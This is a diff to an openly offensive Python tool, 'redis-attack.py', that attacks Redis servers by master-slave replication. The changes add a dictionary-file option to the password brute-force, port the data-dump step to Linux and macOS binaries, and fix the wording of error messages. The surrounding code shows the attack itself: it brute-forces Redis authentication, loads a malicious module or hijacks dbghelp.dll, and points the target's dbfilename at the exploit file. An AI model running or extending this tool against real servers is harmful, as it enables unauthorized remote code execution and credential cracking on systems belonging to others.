@@ -18,7 +18,9 @@ LOGO = R"""
 Redis-Attack By Replication(linux:4.x/5.x win:>=2.8) author:0671
 """
 usage = R"""python redis-attack.py [-h] -r RHOST [-p RPORT] -L LHOST [-P LPORT] [-wf WINFILE] [-lf LINUXFILE] [-a AUTH] [--brute] [-v]
-Example: python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 --brute
+Example: 
+    python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 --brute
+    python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 -P 80 -b mypwd.txt -i
 """
 
 # Convert command arrays to RESP arrays 
@@ -211,7 +213,10 @@ def printback(remote):
 def run(rhost, rport, lhost, lport):
     # Brute force attack Redis 
     def bruteRedis():
-        with open(pwdfile,'r')as f:
+        if os.path.exists(brute) == False:
+            print("\033[1;31;m[-]\033[0m Where is your brute dict file? ")
+            exit(0)
+        with open(brute,'r')as f:
             pwd = f.readline()
             while pwd:
                 pwd = pwd.strip()
@@ -262,18 +267,18 @@ def run(rhost, rport, lhost, lport):
         if 'Linux' in redis_os and int(redis_version[0])>=4:
             print("[√] Can use master-slave replication to load the RedisModule to attack the redis")
             if os.path.exists(linuxfilename) == False:
-                print("\033[1;31;m[-]\033[0m Where you module(linux)? ")
+                print("\033[1;31;m[-]\033[0m Where is your module(linux)? ")
                 exit(0)
             expfile = os.path.basename(linuxfilename)
         elif 'Windows' in redis_os:
             print("[√] Can use master-slave replication to hijack dbghelp.dll to attack the redis")
             if os.path.exists(winfilename[0]) == False:
-                print("\033[1;31;40m[-]\033[0m Where you dbghelp.dll? ")
+                print("\033[1;31;40m[-]\033[0m Where is your dbghelp.dll? ")
                 exit(0)
             if int(redis_version[0])>=4:
                 print("[√] Can use master-slave replication to load the RedisModule to attack the redis")
                 if os.path.exists(winfilename[1]) == False:
-                    print("\033[1;31;40m[-]\033[0m Where you module(win)? ")
+                    print("\033[1;31;40m[-]\033[0m Where is your module(win)? ")
                     exit(0)
             while 1:
                 choice = input("\033[92m[+]\033[0m What do u want ? [h]ijack dbghelp.dll or [l]oad module or [e]xit: ")
@@ -305,8 +310,16 @@ def run(rhost, rport, lhost, lport):
             print("[*] Saveing dbdata")
             if need_auth:
                 os.environ["REDISDUMPGO_AUTH"] = pwd
-            # Keep Redis data as command form via rd.exe 
-            os.system("rd.exe -host {} -port {} -s -output commands > {}".format(rhost, rport, "_redis-db.dump"))
+            # Keep Redis data as command form redis-dump-go
+            if "darwin" in sys.platform:
+                rdfile = os.path.join(os.path.basename("util"),"rd_osx") 
+                os.system("chmod 754 {}".format(rdfile))
+            elif "linux" in sys.platform:
+                rdfile = os.path.join(os.path.basename("util"),"rd_linux")
+                os.system("chmod 754 {}".format(rdfile))
+            elif "win" in sys.platform:
+                rdfile = os.path.join(os.path.basename("util"),"rd_win") 
+            os.system("{} -host {} -port {} -s -output commands > {}".format(rdfile, rhost, rport, "_redis-db.dump"))
         # Set the dbfilename of the target Redis 
         remote.do("CONFIG SET dbfilename {}".format(expfile))
         printback(remote)
@@ -376,16 +389,15 @@ def main():
     parser.add_argument("-wf2", "--winfile2", type=str, help="RedisModules(win) to load, default exp.dll", default='exp.dll')
     parser.add_argument("-lf", "--linuxfile", type=str, help="RedisModules(linux) to load, default exp.so", default='exp.so')
     parser.add_argument("-a", "--auth", dest="auth", type=str, help="redis password", default='gugugu')
-    parser.add_argument("--brute", action="store_true", help="If redis needs to verify the password, perform a brute force attack base in pwd.txt",default=False)
+    parser.add_argument("-b","--brute", nargs='?', help="If redis needs to verify the password, perform a brute force attack, dict default pwd.txt",const='pwd.txt',default=False)
     parser.add_argument("-i", "--idontcare", action="store_true", help="don't care about the data on the target redis", default=False)
     parser.add_argument("-v", "--verbose", action="store_true", help="show more info", default=False)
     options = parser.parse_args()
 
     print("[*] Connecting to  {}:{}...".format(options.rhost, options.rport))
-    global payload, verbose, linuxfilename, winfilename, auth, brute, pwdfile, idontcare
+    global payload, verbose, linuxfilename, winfilename, auth, brute, idontcare
     auth = options.auth
     brute = options.brute
-    pwdfile = "pwd.txt"
     linuxfilename = options.linuxfile
     winfilename = [options.winfile,options.winfile2]
     idontcare = options.idontcare
